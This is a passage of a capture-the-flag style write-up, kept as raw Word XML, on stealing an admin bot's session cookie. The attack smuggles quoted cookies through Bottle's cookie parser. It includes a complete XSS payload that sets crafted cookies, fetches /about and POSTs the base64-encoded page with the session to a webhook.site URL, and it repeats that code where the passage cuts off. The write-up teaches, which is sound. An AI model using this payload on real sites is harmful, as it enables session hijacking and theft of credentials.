      <w:r>
        <w:t>We need to craft our cookies so that when the browser sends them, they appear in an order that the Bottle parser will misinterpret.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EF58DD" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Let's visualize how the browser would send cookies with different paths:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0730F6F2" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>Cooki</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cookie_with_long_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=value; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cookie_with_short_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7E6186" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>And if we update cookies at different times:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17705A0D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cookie: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>older_cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=value; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>newer_cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3B6EAD" w14:textId="75332D1E" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F11C767" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Our exploitation strategy involves manipulating cookie order and quo</w:t>
      </w:r>
      <w:r>
        <w:t>te placement to trick Bottle's parser:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081B8B1F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Set a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie with an opening quote but no closing quote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B4C96E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Set another cookie that will be ordered at the end with a closing quote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A03808" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Ensure the browser orders these to create our malformed cookie string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42927827" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Have the admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> bot visit our page with this exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08184391" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Extract the exposed session cookie from the page's HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E4CB86" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Here's our XSS payload for the note content:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55608FD9" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;/p&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>// Step 1: Set the lang cookie with an unclosed quote at /about path</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>="lang=\"A; path=/a</w:t>
      </w:r>
      <w:r>
        <w:t>bout";</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>// Step 2: Set a test cookie that will appear at the end with a closing quote</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>="test=A\"; path=/";</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>// this will make the cookies like this `lang="A; lang=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=VALUE; test=A"`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>// The reason of the two lang cookies is because e</w:t>
      </w:r>
      <w:r>
        <w:t>ach one has different path.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>// Step 3: Visit the /about page which will include our smuggled cookies</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>fetch('/about',{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>credentials:'include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'})</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  .then(r=&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>r.text</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>())</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  .then(b=&gt;{</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    // Step 4: Send the HTML response (which should contain smuggled session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> data) to webhook</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    fetch('https://webhook.site/8ec54552-dfee-4110-bf72-d75d61adeeb9/log',{</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>method:'POST</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>',</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      headers:{'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Content-Type':'application</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'},</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>body:'data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>='+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>btoa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(b)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  })</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  .catch(e=&gt;{</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    // Fallback for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> error reporting</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    new Image().src='https://webhook.site/8ec54552-dfee-4110-bf72-d75d61adeeb9?error='+encodeURIComponent(e.message);</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  });</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/script&gt;&lt;p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747B4C33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The Exploit Mechanics Explained</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39272E99" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Let's break down how this exploit works in exquisite detail:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3376FB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1. Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Path Manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64683507" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">We set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie with a specific path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC73014" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>="lang=\"A; path=/about";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508C1D45" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This does several things:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4BCE23" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sets the cookie name to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392FE809" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sets its value to start with a quote: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>"A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE57A81" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Specifies the path as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which means this cookie will only be sent for requests to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or its subdirectories</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6799B3E0" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Crucially</w:t>
      </w:r>
      <w:r>
        <w:t>: The quote is not closed, which will confuse the Bottle parser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9692E3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2. Closing the Quote Chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418DC144" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">We then set a second cookie with a path of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763C2D62" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>="test</w:t>
      </w:r>
      <w:r>
        <w:t>=A\"; path=/";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA60714" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656A7B7B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Creates a cookie named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>A"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41100935" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Uses the root path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which applies to all requests but is shorter than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3E02D5" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Provides a closing quote that will "terminate" our malformed cookie string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FF7148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3. Browser Cookie Ordering Magic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA9B111" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">When the browser makes a request to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t>, it will send cookies in a specific order:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFAD82F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie first (longer path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544431FA" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">The other lang cookie as it has shorter path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573E38C8" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The admin's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie (which we can't directly modify)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09153F41" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie last (sh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">orter path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2857FD" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The resulting cookie header would look like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C4414E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie: lang="A; lang=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=ADMIN_SESSION_VALUE; test=A"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190A1040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4. Parser Differential Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321E2298" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>When Bottle receives this cookie header, it parses it according to RFC2965:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4921F5AA" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>It sees the opening quote in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang="A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DA496F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>It continues reading until it finds a matching closing quote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3FF685" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It finds the closing quote in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>test=A"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E14C4C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It treats everything in between as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie value: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>A; session=ADMIN_SESSION_VALUE; test=A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7538BC60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 xml:space="preserve">5. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:b w:val="0"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Page Target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9F94A1" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>We specifically target th</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> page for several reasons:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3115B1BE" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>It doesn't require authentication, so it's always accessible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285083EA" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It renders the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie value in the HTML (as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attribute)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E18332" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The path matches our cookie's path specification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D72F12C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The resulting HTML will contain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9B2748" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html lang="A; lang=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=ADMIN_SESSION_VALUE; test=A"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743EF08F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>6. Exfiltrating the Data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9FA472" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">Our exploit fetches the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/about</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> page and sends its HTML to our webhook:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6074850D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
      </w:pPr>
      <w:r>
        <w:t>fetch('/about',{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>credentials:'include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'})</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  .then(r=&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>r.text</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>())</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  .then(b=&gt;{</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    fetch('https://webho</w:t>
      </w:r>
      <w:r>
        <w:t>ok.site/8ec54552-dfee-4110-bf72-d75d61adeeb9/log',{</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>method:'POST</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>',</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      headers:{'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Content-Type':'application</w:t>
      </w:r>
